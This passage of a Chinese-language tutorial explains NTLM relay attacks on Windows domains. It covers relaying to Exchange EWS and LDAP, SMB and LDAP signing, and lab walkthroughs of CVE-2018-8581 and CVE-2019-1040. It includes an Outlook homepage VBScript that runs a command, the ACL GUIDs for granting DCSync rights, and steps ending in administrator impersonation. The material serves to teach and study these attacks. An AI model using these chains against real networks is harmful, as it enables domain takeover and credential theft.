<p>下面演示使用几款工具在域环境底下，从域控relay到普通机器执行命令</p>
<p>impacket 的底下的smbrelayx.py</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016aa0e38af8b20d9d.png"></p>
<p>impacket 的底下的ntlmrelayx.py</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01691f75c13d572006.png"></p>
<p>Responder底下的MultiRelay.py</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01cfb45589a4ab815f.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01504ad4e6a29d3c92.png"></p>
<h4 id="Relay2EWS"><a href="#Relay2EWS" class="headerlink" title="Relay2EWS"></a>Relay2EWS</h4><p> Exchange的认证也是支持NTLM SSP的。我们可以relay的Exchange，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网，这是最刺激的。<br>​<br>下面演示通过<a href="https://github.com/Arno0x/NtlmRelayToEWS">NtlmRelayToEWS</a>(事实上，工具挺多的。其他的大家可以上github自己找)来实现</p>
<p>Relay2ews</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010d550875927b8f5e.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011afceb68b79372ca.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d5e80035e172d3c5.png"></p>
<p>配合homepage 能够实现命令执行的效果</p>
<p>homepage的简易demo代码如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Language&quot;</span> <span class="attr">content</span>=<span class="string">&quot;en-us&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=windows-1252&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Outlook<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">clientEventHandlersVBS</span> <span class="attr">language</span>=<span class="string">vbscript</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="comment">&lt;!--</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars"> Sub window_onload()</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">     Set Application = ViewCtl1.OutlookApplication</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">     Set cmd = Application.CreateObject(&quot;Wscript.Shell&quot;)</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">     cmd.Run(&quot;calc&quot;)</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars"> End Sub</span></span></span></span><br><span class="line"><span class="comment"><span class="language-xml"><span class="language-handlebars">--&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:0006F063-0000-0000-C000-000000000046&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ViewCtl1&quot;</span> <span class="attr">data</span>=<span class="string">&quot;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>放置于web服务器。在<a href="https://github.com/Arno0x/NtlmRelayToEWS">NtlmRelayToEWS</a> 里面通过-u 参数指定。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016a591f9a50f67365.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016a591f9a50f67365.png"></p>
<h4 id="Relay2LDAP"><a href="#Relay2LDAP" class="headerlink" title="Relay2LDAP"></a>Relay2LDAP</h4><p>不管是杀伤力巨大的8581还是1040。Relay到ldap都在里面发挥着巨大的作用。<br>relay 到ldap的话，能干嘛呢<br>这里着重介绍三种通用性比较强的利用思路。这三种在impacket里面的ntlmrelayx都有实现。(这三种通用性比较强而已，实际中这个的利用比较灵活，需要通过 nTSecurityDescriptor分析用户在域内对哪些acl有权限，什么权限。关于acl怎么深入利用,这里不再展开，后面在ldap篇会详细说明)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b31d966b33575140.png"></p>
<ol>
<li>高权限用户<br>如果NTLM发起用户在以下用户组</li>
</ol>
<ul>
<li>Enterprise admins</li>
<li>Domain admins</li>
<li>Built-in Administrators</li>
<li>Backup operators</li>
<li>Account operators</li>
</ul>
<p>那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e4daef09128988f5.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01db1fea97b977fe39.png"></p>
<ol start="2">
<li>write-acl 权限</li>
</ol>
<p>如果发起者对DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)和DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)有write-acl 权限，那么就可以在该acl里面添加任意用户，从而使得该用户可以具备dcsync的权限</p>
<p>这个案例的典型例子就是Exchange Windows Permissions组，我们将在下一篇介绍8581的 时候详细说下这个用户组的权限。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e584908a9750a6e0.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0183b05d5cce2a771d.png"></p>
<ol start="3">
<li>普通用户权限</li>
</ol>
<p>在server2012r2之后，如果没有以上两个权限。可以通过设置基于资源的约束委派。</p>
<p>在NTLM发起者属性马上到！S-AllowedToActOnBehalfOfOtherIdentity里面添加一条ace,可以让任何机器用户和服务用户可以控制该用户(NTLM发起者)。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0162651181f81ddd6b.png"></p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><h3 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h3><p>这是NTLM篇的最后一块了，在之前已经花了三大部分阐述了跟NTLM_Relay有关的方方面面的内容。在该块中将要介绍下签名，他决定了NTLM_Relay能不能利用成功。以及我们将会介绍跟NTLM_Relay相关的一些漏洞,MS08-068,MS16-074,CVE-2015-0005,CVE2019-1040,CVE-2019-1384，将整个NTLM_Relay漏洞利用串起来。在之后阐述NTLM_Relay漏洞利用链的时候，我们会主要从一下三方面阐述。</p>
<ol>
<li><p>怎么发起ntlm请求</p>
</li>
<li><p>拿到ntlm 请求之后要做什么</p>
</li>
<li><p>服务端是否要求签名</p>
</li>
</ol>
<h3 id="SMB签名-以及LDAP签名"><a href="#SMB签名-以及LDAP签名" class="headerlink" title="SMB签名 以及LDAP签名"></a>SMB签名 以及LDAP签名</h3><h4 id="关于签名的一点细节"><a href="#关于签名的一点细节" class="headerlink" title="关于签名的一点细节"></a>关于签名的一点细节</h4><p>当认证完毕之后，使用一个客户端和服务端都知道的key 对后续所有的操作进行加密，攻击者由于没有key，也没法对内容进行加密解密，所以也就没办法进行Relay,最多只能将流量原封不动转发过去。那这个key是什么呢。之前在网上看到的一个说法就是这个key是session_key，需要使用用户hash去生成，攻击者没有用户hash(有也就不需要Relay了，直接pth多好)，所以没有session_key,也就是没办法加解密，这个时候签名也就起到了防御Relay的效果。</p>
<p>下面详细介绍下三个key，比较绕，大家大致理解下。(对于3个key的命名，不同地方表述不同)</p>
<ol>
<li>exported_session_key</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">get_random_export_session_key</span><span class="params">()</span>:</span><br><span class="line">    <span class="keyword">return</span> os.<span class="title function_">urandom</span><span class="params">(<span class="number">16</span>)</span></span><br></pre></td></tr></table></figure>

<p>这个key是随机数。如果开启签名的话，客户端和服务端是用这个做为key进行签名的。</p>
<ol start="2">
<li>key_exchange_key</li>
</ol>
<p>这个key使用用户密码，Server Challenge,Client Challenge经过一定运算得到的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f6642281b8157af5.png"></p>
<ol start="3">
<li>encrypted_random_session_key</li>
</ol>
<p>前面说过开启签名的话，客户端是使用exported_session_key做为key进行加密解密的，而exported_session_key是客户端生成的随机数，那服务端不知道这个key。这个时候就需要协商密钥。encrypted_random_session_key的生成如下图所示，使用key_exchange_key做为Key,RC4加密算法加密exported_session_key。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01864bb7cfb55ad23a.png"></p>
<p>对于攻击者，由于没有用户hash，也就没办法生成key_exchange_key，虽然在流量里面能够拿到encrypted_random_session_key，但是没有key_exchange_key，也就没办法运算出exported_session_key，也就没法对流量进行加解密。从而进行Relay。</p>
<h4 id="SMB-签名"><a href="#SMB-签名" class="headerlink" title="SMB 签名"></a>SMB 签名</h4><p>有些地方表述为个人pc 默认没有开启smb签名，服务器计算机默认开启smb签名，在我实际测试中发现这个说法是不正确。在域内的默认设置是仅在域控制器上启用，域成员机器并没有启用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0111febb2898f4b59b.png"></p>
<h4 id="LDAP-签名"><a href="#LDAP-签名" class="headerlink" title="LDAP 签名"></a>LDAP 签名</h4><p>在默认情况底下，ldap服务器就在域控里面，而且默认策略就是协商签名。而不是强制签名。也就是说是否签名是有客户端决定的。服务端跟客户端协商是否签名。(客户端分情况，如果是smb协议的话，默认要求签名的，如果是webadv或者http协议，是不要求签名的)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b80068da80370b02.png"></p>
<p>微软公司于 2019-09-11 日发布相关通告称微软计划于 2020 年 1 月发布安全更新。为了提升域控制器的安全性，该安全更新将强制开启所有域控制器上 LDAP channel binding 与 LDAP signing 功能。</p>
<h3 id="漏洞概览"><a href="#漏洞概览" class="headerlink" title="漏洞概览"></a>漏洞概览</h3><h4 id="MS08-068"><a href="#MS08-068" class="headerlink" title="MS08-068"></a>MS08-068</h4><p>在这之前，当拿到用户的smb请求之后，最直接的就是把请求Relay回用户本身，即Reflect。从而控制机子本身。漏洞危害特别高。微软在kb957097补丁里面通过修改SMB身份验证答复的验证方式来防止凭据重播，从而解决了该漏洞。防止凭据重播的做法如下:</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0136db5569cead54d9.png"></p>
<p>主机A向主机B(访问\B)进行SMB认证的时候，将pszTargetName设置为cifs&#x2F;B,然后在type 2拿到主机B发送Challenge之后，在lsass里面缓存(Challenge,cifs&#x2F;B)。</p>
<p>然后主机B在拿到主机A的type 3之后，会去lsass里面有没有缓存(Challenge,cifs&#x2F;b)，如果存在缓存，那么认证失败。</p>
<p>这种情况底下，如果主机B和主机A是不同的主机的话，那lsass里面就不会缓存(Challenge,cifs&#x2F;B)。如果是同一台主机的话，那lsass里面肯定有缓存，这个时候就会认证失败。</p>
<h4 id="CVE-2015-0005"><a href="#CVE-2015-0005" class="headerlink" title="CVE-2015-0005"></a>CVE-2015-0005</h4><p>本文前面说过，在签名的情况底下。对于攻击者，由于没有用户hash，也就没办法生成key_exchange_key，虽然在流量里面能够拿到encrypted_random_session_key，但是没有key_exchange_key，也就没办法算出exported_session_key，也就没法对流量进行加解密。从而进行Relay。</p>
<p>攻击者一旦拿到key_exchange_key的话，就可以进行Relay。而CVE-2015-0005正好是泄漏了这个key，因此这里单独拿出来说说。</p>
<p>之前的文章说过，在域内进行NTLM_RELAY的时候，如果登录的用户是域用户，这个时候认证服务器本地是没有域用户的hash的，这个时候会通过NETLOGON把type 1,type 2,type 3全部发给域控，让域控去判断。并不是向域控索要域用户的hash。那在认证之后，由于没有用户的hash，也没有办法算出key_exchange_key，这个时候认证服务器就会通过NETLOGON去找域控索要key_exchange_key。从而算出exported_session_key。</p>
<p>但是这个漏洞就出在，不是只有认证服务器才能找域控索要key_exchange_key，只要是机器用户来索要key_exchange_key，域控都会给，并没有做鉴权。我们拥有一个机器用户的话，可以去找域控索要key_exchange_key，然后跟流量里面的encrypted_random_session_key算出exported_session_key，使用exported_session_key进行加解密。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d25f110cff2a7b8a.png"></p>
<p>对于该漏洞，在impacket的<code>smbrelayx.py</code>已经集成</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011ae25a51a9d6859f.png"></p>
<p>不需要指定额外的参数，当发现服务端要求进行签名的时候就会自动调用(当然，需要指定一个机器用户以及他的凭据，不然漏洞无法利用)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01642797f1682fae01.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f28026316ceae041.png"></p>
<h4 id="MS16-075"><a href="#MS16-075" class="headerlink" title="MS16-075"></a>MS16-075</h4><p>这个漏洞也叫Hot Potato，从这个漏洞引申出很多Potato，比如Rotten Potato，Ghost potato。</p>
<p>这是一个典型的NTLM_RELAY利用链。按照Relay的一般流程，我们从三方面着手，将思路串起来，达到本地提权的效果。</p>
<ol>
<li><p>怎么发起ntlm请求<br>发起ntlm请求请求的方式我们最早在Windows内网协议学习NTLM篇之发起NTLM请求里面已经说过，就是配合NBNS投毒欺骗和伪造WPAD代理服务器拿到用户的Net-NTML hash，所有的HTTP请求将会被重定向至<code>http://localhost/GETHASHESxxxxx</code>，其中的xxxxx表示的是某些唯一标识符。将会影响目标主机中所有的用户，包括管理员账户和系统账户。更多关于NBNS和wpad的细节，在之前的文章已经说过了，这里不再赘述。</p>
</li>
<li><p>拿到ntlm 请求之后要做什么<br>MS08-068虽然限制了同台主机之间smb到smb的Relay，但是并没有限制从http到smb，我们配置配合NBNS投毒欺骗和伪造WPAD代理服务器拿到的ntlm请求说http的形式，我们可以直接relay 到本机的smb。</p>
</li>
<li><p>服务端是否要求签名<br>我们Relay到的服务端协议是smb，除非是域内的域控，不然在工作组环节底下，或者域内的域成员机器，都是不要求签名的。</p>
</li>
</ol>
<h4 id="CVE-2018-8581"><a href="#CVE-2018-8581" class="headerlink" title="CVE-2018-8581"></a>CVE-2018-8581</h4><p>这个漏洞最早是一个SSRF漏洞。可以访问任意用户的邮件。</p>
<p>该漏洞由SSRF漏洞结合NTLM_RELAY可以访问任意用户的邮件，获取域管权限。按照Relay的一般流程，我们从三方面着手，将思路串起来，从而达到获取域管的效果。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fd2740d19b45b983.png"></p>
<ol>
<li><p>怎么发起ntlm请求<br>Exchange允许任何用户为推送订阅指定所需的URL，服务器将尝试向这个URL发送通知。问题出在Exchange服务器使用<a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.credentialcache.defaultcredentials?view=net-6.0">CredentialCache.DefaultCredentials</a>进行连接。传进的URL我们可控，也就说我们可以控制Exchange服务器向我们发起HTTP 协议的NTLM 请求。我们就能拿到Exchange机器用户的 Net-Ntlm Hash。如图中的步骤1，步骤2所示。</p>
</li>
<li><p>拿到ntlm 请求之后要做什么<br>当我们拿到ntlm 请求的时候网上主要有两种利用思路。</p>
</li>
</ol>
<ul>
<li>思路1 访问任意用户的邮件<br>由于Exchange服务器还默认设置了以下注册表项</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LsaDisableLoopbackCheck = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>也就是说我们可以将请求Relay 回机器本身。我们拿到的是机器用户的Net-Ntlm Hash。并不能直接用以登录。但是Exchange 机器用户可以获得TokenSerializationRight的”特权”会话，可以Relay 到 机子本身的Ews接口，然后可以使用SOAP请求头来冒充任何用户。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013e4122b3e51e2740.png"></p>
<p>这个也是网上流传得比较广的一份<a href="https://github.com/WyAtu/CVE-2018-8581">exp</a>的利用思路</p>
<ul>
<li>思路2 获取域管权限</li>
</ul>
<p>在上一部分中的Relay2Ldap里面，我们简单得提了一下这个思路 。这里我们详细说下。</p>
<p>我们来做个测试</p>
<p>用户daiker 对域没有acl</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017169770375f16247.png"></p>
<p>这个时候进行Dcsync</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0103e6ba08d3c3fa92.png"></p>
<p>权限不足,这个时候我们添加两条ACL</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes&#x27;</span>     = <span class="number">1131f</span>6aa<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes-All&#x27;</span> = <span class="number">1131f</span>6ad<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ec9b9524e524f8a5.png"></p>
<p>验证一下</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c8850e2a8783bad0.png"></p>
<p>这个时候我们进行dcsync</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01f2c68f6de0cba266.png"></p>
<p>成功，也就是说如果我们只要能够在域内添加两台ACL，这两条ACL的受托人就具备Dcsync的权限。<br>那什么样子的用户才能具备添加 ACL的权限呢。我们通过adfind 查下(下一个系列LDAP篇将紧紧围绕adfind和admod展开)。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0130409e1d9046a251.png"></p>
<p>我们发现<code>Exchange Windows Permissions,Exchange Trusted Subsystem</code>都具备Write-ACL的权限。</p>
<p>其实<code>Exchange Trusted Subsystem</code>是<code>Exchange Windows Permissions</code> 组内成员</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0143d8fa8afdba6f98.png"></p>
<p>Exchange Trusted Subsystem的成员包括Exchange机器用户</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d9c8fd106457f410.png"></p>
<p>前面啰嗦了一大堆，现在来总结下获取域管权限的思路。</p>
<p>由于Exchange机器在Exchange Trusted Subsystem组里面，Exchange Trusted Subsystem对域有Write-ACL权限，Exchange机器用户自然而然具备Write-ACL权限，我们在拿到Exchange机器的http请求的时候，可以将请求Relay到Ldap,然后由于Exchange机器</p>
<p>用户具备Write-ACL权限，我们在域内给添加两条acl，acl的受托人可以是任意用户，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes&#x27;</span>     = <span class="number">1131f</span>6aa<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes-All&#x27;</span> = <span class="number">1131f</span>6ad<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br></pre></td></tr></table></figure>

<p>从而使该用户具备Dcsync的权限。然后dump 域管的hash进行pth，dump kebtgt的hash进行黄金票据，等等。<br>服务端是否要求签名</p>
<ol start="3">
<li>我们Relay到的服务端是Ldap,前面咱们说过Ldap服务器的默认策略是协商签名。而不是强制签名。也就是说是否签名是有客户端决定的。服务端跟客户端协商是否签名。在这个漏洞里面发起的请求是http协议，http协议是不要求进行签名，这也就意味着我们什么都不用做，在这个漏洞中并不要求签名。</li>
</ol>
<p>最后梳理一下8581第二种思路(获取域管权限)的打法:</p>
<p>这里面<br>​<br>    攻击者:172.16.228.1<br>    ​<br>    Exchange:172.16.228.133<br>    ​<br>    域控:172.16.228.135</p>
<ol>
<li>使用impacket监听端口进行等待连接</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d7e208860e2d135b.png"></p>
<ol start="2">
<li>发起推送订阅指定所需的URL，Exchange. 服务器将尝试向这个URL发送通知</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010a90ea44fc24448f.png"></p>
<ol start="3">
<li>Relay 到域控的Ldap 服务器并给普通用户daiker添加两条acl</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bb0b802ddc4b8ff8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0182c5f04ec5c601f5.png"></p>
<ol start="4">
<li>daiker进行Dcync</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0185dcce4f1830d535.png"></p>
<h4 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h4><p>该洞最早在于攻击者可以利用该漏洞可绕过NTLM MIC的防护机制。很经典的一次NTLM_RELAY 。相信如果从windows内网协议学习从第一篇文章追踪过来的，对每个利用环节都无比熟悉。本篇文章要做的内容就是把这些漏洞利用点给串起来。跟CVE-2018-8581一样，我们主要关注一下三个方面，将思路串起来。</p>
<ol>
<li><p>怎么发起ntlm请求<br>这里利用到打印机漏洞，在<a href='#p5'>NTLM篇之发起NTLM请求</a>,我们有简单提到这个问题，这个也不算漏洞，微软官方认为是正常业务，也不给出补丁。微软的spoolsv.exe注册了一个服务和若干个rpc。允许认证用户远程调用，其中RemoteFindFirstPrinterChangeNotificationEx这个函数运行传进一个unc路径，打印机服务就会去请求该unc路径。由于打印机是以system权限运行的，所以我们访问打印机rpc，迫使打印机服务向我们发起请求拿到的net-ntlm hash是机器用户hash。这个地方有两个利用点。一个是攻击Exchange 机器，迫使Exchange机器用户向我们发起请求，另外一个就是攻击域管机器，迫使域管机器用户向我们发起请求。</p>
</li>
<li><p>拿到ntlm 请求之后要做什么<br>考虑到都是机器用户发起的请求，机器用户并不能直接登录。因此不考虑Relay 到smb。我们考虑Relay到Ldap。当是Exchange机器用户发起的请求时，我们可以跟CVE-2018-8581，由于Exchange机器用户在Exchange Trusted Subsystem组，Exchange Trusted Subsystem 有write-acl权限，可以给任意用户添加 Dcsync权限，这里不再赘述。<br>我们考虑另外一种情况，当发起者是域管用户的时候，这个时候别看是域管机器，但是权限真的并不高。首先，他并不在域管组里面。其次，他能控制的acl也并不多。在<a href='#p6'>NTLM篇之Net-NTLM利用</a>里面我们介绍了三种通用的漏洞利用思路，前两种在这种情况下，在这里并不适用，在server2012r2，我们可以通过设置基于资源的约束委派。在域管机器属性马上到！S-AllowedToActOnBehalfOfOtherIdentity里面添加一条ace,可以让任何机器用户和服务用户可以控制该用户(NTLM发起者)，虽然不能直接登录，但是因为该机器是域管机器，我们可以进行dcync。</p>
</li>
<li><p>服务端是否要求签名<br>我们Relay到的服务端是Ldap,前面咱们说过Ldap服务器的默认策略是协商签名。而不是强制签名。也就是说是否签名是有客户端决定的。服务端跟客户端协商是否签名。不像CVE-2018-8581，发起的协议是HTTP协议，通过打印机漏洞，发起的请求是Smb协议的请求，这也意味着我们客户端默认是要求签名的。这也是这个漏洞的核心所在。前面的思路，在<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a>里面就已经提到了，作者在文章里面提及。</p>
</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0152f58737cb3ef6ad.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01ab25a2d2d94f4fa2.png"></p>
<p>这个标识用于协商服务端是否进行签名，因为发起者是smb协议，默认这个标志位(即NTLMSSP_NEGOTIATE_ALWAYS_SIGN和NTLMSSP_NEGOTIATE_SIGN)为1，服务端会选择进行签名，但是当我们修改数据包将Flag位置为0的话，微软又设计了一套MIC校验。就是下图这个。它使用带有会话密钥的HMAC-MD5保护所有三个NTLM消息的完整性。如果更改了NTLM消息的Flag位，则MIC将无效并且身份验证将失败。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01805077904a992c42.png"></p>
<p>有另外一个地方指示是否存在MIC(标志0x2表示该消息包括MIC)。如下图所示，我们称为msvAvFlag</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01739b840016a02b69.png"></p>
<p>但是msvAvFlag 在targetInfo里面。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0197dfac4ecb9c4911.png"></p>
<p>由于在计算Reponse的时候，该targetInfo参与Reponse的计算。(关于Response计算的更多细节可以此参考<a href='#p8'>NTLM篇之NTLM基础</a>介绍)</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011f9f836f7aba8be3.png"></p>
<p>改变了msvAvFlag值，targetInfo的值随之发生那改变，生成的Reponse在检验的时候肯定会出错，NetNTLM响应将无效并且身份验证将失败。这个时候原文的作者也没有办法了。<br>但是前面已经说过了，该洞最早在于攻击者可以利用该漏洞可绕过NTLM MIC的防护机制。因此这个漏洞最核心的地方在于绕过了MIC的校验。<br>最新的绕过将NEGOTIATE_KEY_EXCHANGE和NEGOTIATE_VERSION位置为0，就不再检验MIC了。不像msvAvFlag那样参与Reponse的运算，因此置为0之后不仅不会校验mic，也不会使得Reponse校验出错。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014b70c62c4e0e2a01.png"></p>
<p>所以这一步，需要将4个Flag 位(TLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION)置0。<br>最后梳理一下1040的打法:<br>这里面<br>​ 攻击者:172.16.99.2<br>​ 域控2012:172.16.99.12<br>​ 域控2016:172.16.99.16</p>
<ol>
<li>使用impacket监听445进行等待域控进行连接</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e70b2c599e85198b.png"></p>
<ol start="2">
<li>使用打印机漏洞让域控连接我们的445(注意攻击的域控跟回连的LDAP所在的服务器不要在同一台域控)</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01657eb2793c5cc888.png"></p>
<ol start="3">
<li>Relay 到域控dc2016的Ldap 服务器并添加基于资源的约束委派</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b13dd70411879f7f.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017d2da29e2f504d93.png"></p>
<ol start="4">
<li>发起win7$到dc2012的s4u，通过-impersonate参数模拟用户administrator的票证</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b8086fc2d25f27ba.png"></p>
<ol start="5">
<li>使用administrator用户的票据登录域控。</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011472bc7b0d3a5051.png"></p>
<h4 id="CVE-2019-1384"><a href="#CVE-2019-1384" class="headerlink" title="CVE-2019-1384"></a>CVE-2019-1384</h4><p>这个漏洞绕过了MS08-068之后，用户不能relay回本机的限制。先来回顾下MS08-068是怎么防止Relay的。</p>
<blockquote>
<p>主机A向主机B(访问\B)进行SMB认证的时候，将pszTargetName设置为cifs&#x2F;B,然后在type 2拿到主机B发送Challenge之后，在lsass里面缓存(Challenge,cifs&#x2F;B)。</p>
</blockquote>
<blockquote>
<p>然后主机B在拿到主机A的type 3之后，会去lsass里面有没有缓存(Challenge,cifs&#x2F;b)，如果存在缓存，那么认证失败。</p>
</blockquote>
<blockquote>
<p>这种情况底下，如果主机B和主机A是不同的主机的话，那lsass里面就不会缓存(Challenge,cifs&#x2F;B)。如果是同一台主机的话，那lsass里面肯定有缓存，这个时候就会认证失败。</p>
</blockquote>
